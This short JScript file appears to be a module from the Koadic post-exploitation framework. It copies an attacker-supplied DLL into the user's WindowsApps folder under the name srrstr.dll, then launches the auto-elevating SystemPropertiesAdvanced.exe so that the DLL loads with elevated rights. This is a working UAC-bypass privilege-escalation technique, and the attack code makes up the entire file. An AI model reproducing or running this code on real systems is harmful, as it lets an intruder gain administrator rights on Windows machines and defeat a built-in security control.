try
{
    var myObject = new ActiveXObject("Scripting.FileSystemObject");
    var myPath = "C:\\Users\\"+ '~USER~' + "\\AppData\\Local\\Microsoft\\WindowsApps\\srrstr.dll";
    var dll = '~DLL~'
    myObject.CopyFile (dll, myPath);
    Koadic.shell.run("C:\\Windows\\syswow64\\systempropertiesadvanced.exe", true);
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
